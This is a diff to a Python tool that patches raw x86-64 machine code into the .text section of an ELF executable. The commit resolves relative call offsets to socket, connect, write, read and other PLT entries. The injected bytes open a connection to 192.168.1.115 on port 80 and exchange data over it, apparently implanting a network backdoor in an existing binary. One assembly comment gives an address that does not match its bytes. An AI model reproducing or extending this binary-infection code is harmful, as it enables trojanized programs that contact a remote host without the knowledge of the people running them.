@@ -583,16 +583,12 @@ def edit_text_section_calls():
 
 
 def inject_code():
+    print("socketPLT = ",hex(socketPLT))
     sizes = []
     total_length = len(inject) + len(call_inject_indices) * 3
     print("TOTAL LENGTH",total_length)
     i = 0
-    print("index:",hex(inject.index(0x11223344)))
 
-    my_indices = [index for index, value in enumerate(inject) if value == 0x11223344]
-
-    for num in my_indices:
-        print("INDEX:",hex(num))
     while i < len(inject) + len(call_inject_indices) * 3:
         #print(hex(i))
         if i in call_inject_indices:
@@ -756,14 +752,24 @@ print("ALIGNMENT SIZES",ELF_SECTIONS_ALIGNMENT_SIZES)
 print("SECTION OFFSETS",SECTIONS_OFFSETS)
 print("INJECT OFFSETS",INJECT_OFFSETS)
 
-socketPLT = 0x11223344
-memsetPLT = 0x11223344
-connectPLT =0x11223344
-writePLT =  0x11223344
-strlenPLT = 0x11223344
-closePLT =  0x11223344
-readPLT =   0x11223344
-stack_chk_failPLT = 0x11223344
+def calc_call_operand(plt_sec_index,inject_offset):
+    size_of_call = 4
+    plt_entry_location = calc_new_offset(PLT_SEC_INJECT_OFFSET + plt_sec_index * PLT_SEC_ENTRY_SIZE,plt_sec_section_index)
+    instruction_pointer = calc_new_offset(TEXT_INJECT_OFFSET + inject_offset + size_of_call,text_section_index)
+    return 0xffffffff + 1 - abs(plt_entry_location - instruction_pointer)
+
+plt_sec_section_index = ELF.get_section_index('.plt.sec')
+text_section_index = ELF.get_section_index('.text')
+
+socketPLT = calc_call_operand(4,0xa2)
+memsetPLT1 = calc_call_operand(0,0xce)
+connectPLT = calc_call_operand(3,0x106)
+strlenPLT = calc_call_operand(7,0x11d)
+writePLT =  calc_call_operand(6,0x15e)
+memsetPLT2 = calc_call_operand(0,0x1b0)
+readPLT =   calc_call_operand(2,0x1f5)
+closePLT =  calc_call_operand(1,0x240)
+stack_chk_failPLT = calc_call_operand(5,0x25c)
 
 call_inject_indices = [0xa2, 0xce, 0x106, 0x11d, 0x15e, 0x1b0, 0x1f5, 0x240, 0x25c]
 
@@ -805,7 +811,7 @@ inject = [
     0xba, 0x10, 0x00, 0x00, 0x00,                               # mov $0x10, %edx
     0xbe, 0x00, 0x00, 0x00, 0x00,                               # mov $0x0, %esi
     0x48, 0x89, 0xc7,                                           # mov %rax, %rdi
-    0xe8,       memsetPLT       ,                               # callq memset@PLT
+    0xe8,       memsetPLT1      ,                               # callq memset@PLT
     0x66, 0xc7, 0x85, 0xb0, 0xef, 0xff, 0xff, 0x02, 0x00,       # movw $0x2, -0x1050(%rbp)
     0x66, 0xc7, 0x85, 0xb2, 0xef, 0xff, 0xff, 0x00, 0x50,       # movw $0x5000, -104e(%rbp)
     0xc7, 0x85, 0xb4, 0xef, 0xff, 0xff, 0xc0, 0xa8, 0x01, 0x73, # movl $0x7e01a8c0, -0x104c(%rbp)
@@ -849,7 +855,7 @@ inject = [
     0xba, 0x00, 0x10, 0x00, 0x00,                               # mov $0x1000, %edx
     0xbe, 0x00, 0x00, 0x00, 0x00,                               # mov $0x0, %esi
     0x48, 0x89, 0xc7,                                           # mov %rax, %rdi
-    0xe8,       memsetPLT       ,                               # callq memset@PLT
+    0xe8,       memsetPLT2      ,                               # callq memset@PLT
     0xc7, 0x85, 0xa8, 0xef, 0xff, 0xff, 0xff, 0x0f, 0x00, 0x00, # movl $0xfff, -0x1058(%rbp)
     0xc7, 0x85, 0xa0, 0xef, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, # movl $0x0, -0x1060(%rbp)
     0x8b, 0x85, 0xa8, 0xef, 0xff, 0xff,                         # movl -0x1058(%rbp), %eax
